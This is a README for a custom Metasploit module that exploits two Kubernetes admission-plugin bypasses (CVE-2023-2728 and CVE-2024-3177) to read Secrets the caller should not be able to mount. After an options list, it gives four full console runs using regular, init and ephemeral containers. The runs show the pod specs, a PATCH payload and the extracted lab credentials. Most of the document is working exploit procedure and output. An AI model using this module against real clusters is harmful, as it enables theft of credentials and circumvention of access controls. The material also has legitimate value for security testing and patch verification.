## Custom Metasploit Module for CVE 2023-2728 and CVE 2024-3177

### Description

This custom module exploits CVE 2023-2728 and CVE 2024-3177 in Kubernetes versions that are vulnerables to each of them (e.g. v1.27.2 is vulnerable to both), both related to bypassing the imposition of the mountable secrets policy imposed by the ServiceAccount admission plugin in Kubernetes, 
with different types of containers and strategies.  
The main objective is to obtain the desired secrets and present them in the environment variables in an attractive way for the user.
## Verification Steps

### Create or acquire the credentials

1. Start msfconsole
2. Do: `use auxiliary/cloud/kubernetes/double_secrets_cve`
3. Set the required options
4. Do: `run`.
5. You should see the secrets highlighted in red specified in the SECRET_NAME option.

## Options
## CONTAINER_TYPE
Defines the type of container to use in the Pod that is created in the target cluster to exploit the vulnerability. It can be normal (equivalent to regular containers), init, or ephemeral.

### CVE
Allows you to select the vulnerability you want to exploit. The available options are 2024-3177 and 2023-2728. If any other vulnerability is specified, the module will not recognize it and will give an error, which is a normal result.

### IMAGE
Specifies the container image to use to create the Pod, such as busybox, the default option, since it is a very useful image due to its lightness and versatility, grouping multiple Linux utilities in a single and small executable and combining the most common utilities in Unix such as ls, cp, mv, cat, or sh, which makes it very appropriate for systems with limited resources or for quick tests, as it may be the case here, where a specific image is not needed, just that the Pod is created correctly.

### NAMESPACE
Indicates the namespace in Kubernetes where the Pod will be created, having to be the same one where the secret to be revealed is located.

### POD_NAME
Defines the name to be given to the Pod to be created.

### PROXIES
String of proxies to use, in the format type:host:port[,type:host:port][...]. This is a standard Metasploit option, which is not used in this module.

### RHOSTS
Specifies the IP address or IP address range of the target, in this case the Kubernetes cluster where you want to exploit the vulnerability. This option is one of the defaults in Metasploit.

### RPORT
Defines the TCP port of the target to which the module will connect. This is a standard Metasploit option.

### SECRET_NAME
Specifies the name of the secret in Kubernetes that you want to disclose, for this you must have the necessary permissions.

### SESSION
Allows you to define whether to reuse an existing session. In this module, this option is not relevant, and is optional. It is a default option.

### SSL
Determines whether an SSL/TLS connection should be negotiated for outgoing connections. This is a standard Metasploit option and it is not mandatory to have it enabled, it depends on how the user in question connects to your target cluster.

### TARGET_URI
Specifies the base path to the Kubernetes API being targeted, for example, /api/v1. This option is custom and is used to make it easier to schedule certain connections in the module.

### TOKEN
Defines the authentication token that will be used to interact with the Kubernetes API, it is important that this token has the necessary permissions, otherwise the module will fail due to lack of permissions to either create or enumerate certain resources within the cluster.

### VHOST
Allows to specify an HTTP virtual host. This is a standard Metasploit option that is not used in the module.


## Scenarios
**Note**: in the markdown the secrets are marked as \** SECRET \** at the beginning and at the end, this is not so in the code, as they have been highlighted in red for better visibility by the user,
something that could not be done in the README file due to the limitations of the Markdown language in the GitHub platform.
### Run it with regular containers to exploit CVE-2024-3177 (Option by default) 
Explicitly setting RHOST and TOKEN to enumerate the secrets specified in the SECRET_NAME option:
```
msf6 > use cloud/kubernetes/double_secrets_cve
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set CONTAINER_TYPE normal
CONTAINER_TYPE => normal
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set RHOSTS 192.168.49.2
RHOSTS => 192.168.49.2
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set RPORT 8443
RPORT => 8443
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set SECRET_NAME dvwa-secrets
SECRET_NAME => dvwa-secrets
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set NAMESPACE dvwa-tfm-mysql
NAMESPACE => dvwa-tfm-mysql
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set POD_NAME cve-pod-1
POD_NAME => cve-pod-1
msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > set TOKEN eyJhbGciO...
TOKEN => eyJhbGciO...
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > run
[*] Running module against 192.168.49.2

[*] Fetching Kubernetes server version...
[+] Kubernetes server version: v1.27.2
[+] The kube-apiserver version v1.27.2 is vulnerable to the selected CVE.
[*] Creating pod with the following spec: {"apiVersion":"v1","kind":"Pod","metadata":{"name":"cve-pod-1","namespace":"dvwa-tfm-mysql"},"spec":{"containers":[{"name":"main-container","image":"busybox","command":["/bin/sh"],"args":["-c","sleep 3600"],"envFrom":[{"secretRef":{"name":"dvwa-secrets"}}]}],"restartPolicy":"Never"}}
[*] Pod not found, creating a new one.
[+] Pod created successfully: cve-pod-1
[*] Waiting for pod cve-pod-1 to be ready...
[*] Pod cve-pod-1 status: Pending
[+] Pod cve-pod-1 is running.
[*] Established Kubernetes client.
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.96.0.1:443
DVWA_MYSQL_SERVICE_PORT_3306_TCP_ADDR=10.99.148.252
HOSTNAME=cve-pod-1
SHLVL=1
DVWA_MYSQL_SERVICE_PORT_3306_TCP_PORT=3306
HOME=/root
DVWA_MYSQL_SERVICE_PORT_3306_TCP_PROTO=tcp
DVWA_MYSQL_SERVICE_SERVICE_HOST=10.99.148.252
** SECRET ** DVWA_PASSWORD=p@ssw0rd ** SECRET **
DVWA_MYSQL_SERVICE_SERVICE_PORT=3306
DVWA_MYSQL_SERVICE_PORT=tcp://10.99.148.252:3306
** SECRET ** DVWA_USERNAME=dvwa ** SECRET **
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
** SECRET ** DVWA_DATABASE=dvwa ** SECRET **
** SECRET ** DVWA_USERNAME=dvwa ** SECRET **
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
PWD=/
[+] Successfully retrieved environment variables from pod cve-pod-1
[*] Auxiliary module execution completed

```
### Run it with init containers to exploit the CVE-2024-3177  
Explicitly setting RHOST and TOKEN to enumerate the secrets specified in the SECRET_NAME option:
```
msf6 > use cloud/kubernetes/double_secrets_cve
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set CONTAINER_TYPE init
CONTAINER_TYPE => init
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set RHOSTS 192.168.49.2
RHOSTS => 192.168.49.2
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set RPORT 8443
RPORT => 8443
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set SECRET_NAME dvwa-secrets
SECRET_NAME => dvwa-secrets
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set NAMESPACE dvwa-tfm-mysql
NAMESPACE => dvwa-tfm-mysql
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set POD_NAME cve-pod-2
POD_NAME => cve-pod-2
msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > set TOKEN eyJhbGciO...
TOKEN => eyJhbGciO...
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > run
[*] Running module against 192.168.49.2
[*] Fetching Kubernetes server version...
[+] Kubernetes server version: v1.27.2
[+] The kube-apiserver version v1.27.2 is vulnerable to the selected CVE.
[*] Creating pod with the following spec: {"apiVersion":"v1","kind":"Pod","metadata":{"name":"cve-pod-2","namespace":"dvwa-tfm-mysql"},"spec":{"containers":[{"name":"init-main-container","image":"busybox","command":["/bin/sh"],"args":["-c","sleep 3600"]}],"restartPolicy":"Never","initContainers":[{"name":"exploit-container","image":"busybox","command":["/bin/sh"],"args":["-c","sleep 3600"],"envFrom":[{"secretRef":{"name":"dvwa-secrets"}}]}]}}
[*] Pod not found, creating a new one.
[+] Pod created successfully: cve-pod-2
[*] Waiting for the init container to start...
[*] Checking pod and container status...
[+] Init container is running.
[*] Retrieving environment variables from init container using Kubernetes API...
[*] WebSocket connection opened

KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.96.0.1:443
DVWA_MYSQL_SERVICE_PORT_3306_TCP_ADDR=10.99.148.252
HOSTNAME=cve-pod-2
SHLVL=1
DVWA_MYSQL_SERVICE_PORT_3306_TCP_PORT=3306
HOME=/root
DVWA_MYSQL_SERVICE_SERVICE_HOST=10.99.148.252
DVWA_MYSQL_SERVICE_PORT_3306_TCP_PROTO=tcp
** SECRET ** DVWA_PASSWORD=p@ssw0rd ** SECRET **
DVWA_MYSQL_SERVICE_PORT=tcp://10.99.148.252:3306
DVWA_MYSQL_SERVICE_SERVICE_PORT=3306
DVWA_MYSQL_SERVICE_PORT_3306_TCP=tcp://10.99.148.252:3306
** SECRET ** ROOT_PASSWORD=dvwa ** SECRET **
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
** SECRET ** DVWA_DATABASE=dvwa ** SECRET **
** SECRET ** DVWA_USERNAME=dvwa ** SECRET **
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
PWD=/
[*] WebSocket connection closed: 1000, 
[*] Auxiliary module execution completed
```

### Run it with ephemeral containers to exploit the CVE-2024-3177  
Explicitly setting RHOST and TOKEN to enumerate the secrets specified in the SECRET_NAME option:
```
msf6 > use cloud/kubernetes/double_secrets_cve
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set CONTAINER_TYPE ephemeral
CONTAINER_TYPE => ephemeral
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set RHOSTS 192.168.49.2
RHOSTS => 192.168.49.2
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set RPORT 8443
RPORT => 8443
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set SECRET_NAME dvwa-secrets
SECRET_NAME => dvwa-secrets
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set NAMESPACE dvwa-tfm-mysql
NAMESPACE => dvwa-tfm-mysql
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set POD_NAME cve-pod-3
POD_NAME => cve-pod-3
msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > set TOKEN eyJhbGciO...
TOKEN => eyJhbGciO...
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > run
[*] Running module against 192.168.49.2

[*] Fetching Kubernetes server version...
[+] Kubernetes server version: v1.27.2
[+] The kube-apiserver version v1.27.2 is vulnerable to the selected CVE.
[*] Creating pod with the following spec: {"apiVersion":"v1","kind":"Pod","metadata":{"name":"cve-pod-3","namespace":"dvwa-tfm-mysql"},"spec":{"containers":[{"name":"ephemeral-main-container","image":"busybox","command":["/bin/sh"],"args":["-c","sleep 3600"]}],"restartPolicy":"Never"}}
[*] Pod not found, creating a new one.
[+] Pod created successfully: cve-pod-3
[*] Waiting for pod cve-pod-3 to be ready...
[*] Pod cve-pod-3 status: Pending
[+] Pod cve-pod-3 is running.
[*] Adding ephemeral container with the following spec: {"name":"ephemeral-container","image":"busybox","envFrom":[{"secretRef":{"name":"dvwa-secrets"}}],"command":["/bin/sh"],"args":["-c","sleep 3600"]}
[*] Ephemeral container addition response code: 200
[*] Ephemeral container addition response message: OK
[+] Successfully added ephemeral container to pod cve-pod-3
[*] Waiting for ephemeral container to be ready...
[*] Ephemeral container status: {:waiting=>{:reason=>"ContainerCreating"}}
[*] Reason: ContainerCreating
[+] Ephemeral container is running.
[*] Waiting for ephemeral container to be ready...
[+] Ephemeral container is running.
[*] Retrieving environment variables from ephemeral container using Kubernetes API...
[*] WebSocket connection opened

KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_SERVICE_PORT=443
DVWA_MYSQL_SERVICE_PORT_3306_TCP_ADDR=10.99.148.252
HOSTNAME=cve-pod-3
SHLVL=1
DVWA_MYSQL_SERVICE_PORT_3306_TCP_PORT=3306
HOME=/root
DVWA_MYSQL_SERVICE_SERVICE_HOST=10.99.148.252
DVWA_MYSQL_SERVICE_PORT_3306_TCP_PROTO=tcp
** SECRET ** DVWA_PASSWORD=p@ssw0rd ** SECRET **
DVWA_MYSQL_SERVICE_PORT=tcp://10.99.148.252:3306
DVWA_MYSQL_SERVICE_SERVICE_PORT=3306
DVWA_MYSQL_SERVICE_PORT_3306_TCP=tcp://10.99.148.252:3306
** SECRET ** ROOT_PASSWORD=dvwa ** SECRET **
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
** SECRET ** DVWA_DATABASE=dvwa ** SECRET **
** SECRET ** DVWA_USERNAME=dvwa ** SECRET **
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
PWD=/
[*] WebSocket connection closed: 1000, 
[*] Auxiliary module execution completed
```
### Run it with ephemeral containers to exploit the CVE-2023-2728
Explicitly setting CVE, RHOST and TOKEN to enumerate the secrets specified in the SECRET_NAME option:
```
msf6 > use cloud/kubernetes/double_secrets_cve
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set CVE 2023-2728
CVE => 2023-2728
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set CONTAINER_TYPE ephemeral
CONTAINER_TYPE => ephemeral
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set RHOSTS 192.168.49.2
RHOSTS => 192.168.49.2
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set RPORT 8443
RPORT => 8443
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set SECRET_NAME dvwa-secrets
SECRET_NAME => dvwa-secrets
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set NAMESPACE dvwa-tfm-mysql
NAMESPACE => dvwa-tfm-mysql
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > set POD_NAME cve-pod-4
POD_NAME => cve-pod-4
msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > set TOKEN eyJhbGciO...
TOKEN => eyJhbGciO...
msf6 auxiliary(cloud/kubernetes/double_secrets_cve) > run
[*] Running module against 192.168.49.2

[*] Fetching Kubernetes server version...
[+] Kubernetes server version: v1.27.2
[+] The kube-apiserver version v1.27.2 is vulnerable to the selected CVE.
[*] Creating pod with standard configuration in namespace: dvwa-tfm-mysql with service account: sa-web
[*] Pod not found. Proceeding with pod creation.
[+] Successfully created pod cve-pod-4 in namespace dvwa-tfm-mysql
[*] Waiting for pod cve-pod-4 to be ready...
[*] Pod cve-pod-4 status: Pending
[+] Pod cve-pod-4 is running.
[*] Attempting to add ephemeral container to access secrets...
[*] Performing PATCH request with the following data: {"spec":{"ephemeralContainers":[{"name":"ephemeral-container","image":"busybox","command":["/bin/sh"],"args":["-c","sleep 3600"],"env":[{"name":"DVWA_DATABASE","valueFrom":{"secretKeyRef":{"name":"dvwa-secrets","key":"DVWA_DATABASE"}}},{"name":"DVWA_PASSWORD","valueFrom":{"secretKeyRef":{"name":"dvwa-secrets","key":"DVWA_PASSWORD"}}},{"name":"DVWA_USERNAME","valueFrom":{"secretKeyRef":{"name":"dvwa-secrets","key":"DVWA_USERNAME"}}},{"name":"ROOT_PASSWORD","valueFrom":{"secretKeyRef":{"name":"dvwa-secrets","key":"ROOT_PASSWORD"}}}]}]}}
[+] Response received
[+] Ephemeral container successfully added to pod cve-pod-4
[*] Waiting for ephemeral container to be ready...
[*] Ephemeral container status: {:waiting=>{:reason=>"ContainerCreating"}}
[*] Reason: ContainerCreating
[+] Ephemeral container is running.
[*] Attempting to access environment variables from the ephemeral container...
[*] WebSocket connection opened

KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_SERVICE_PORT=443
DVWA_MYSQL_SERVICE_PORT_3306_TCP_ADDR=10.99.148.252
HOSTNAME=cve-pod-4
SHLVL=1
DVWA_MYSQL_SERVICE_PORT_3306_TCP_PORT=3306
HOME=/root
DVWA_MYSQL_SERVICE_SERVICE_HOST=10.99.148.252
DVWA_MYSQL_SERVICE_PORT_3306_TCP_PROTO=tcp
** SECRET ** DVWA_PASSWORD=p@ssw0rd ** SECRET **
DVWA_MYSQL_SERVICE_SERVICE_PORT=3306
DVWA_MYSQL_SERVICE_PORT=tcp://10.99.148.252:3306
DVWA_MYSQL_SERVICE_PORT_3306_TCP=tcp://10.99.148.252:3306
** SECRET ** ROOT_PASSWORD=dvwa ** SECRET ** 
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
** SECRET ** DVWA_DATABASE=dvwa ** SECRET **
** SECRET ** DVWA_USERNAME=dvwa ** SECRET **
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
PWD=/
[*] WebSocket connection closed: 1000,     
[*] Auxiliary module execution completed
```
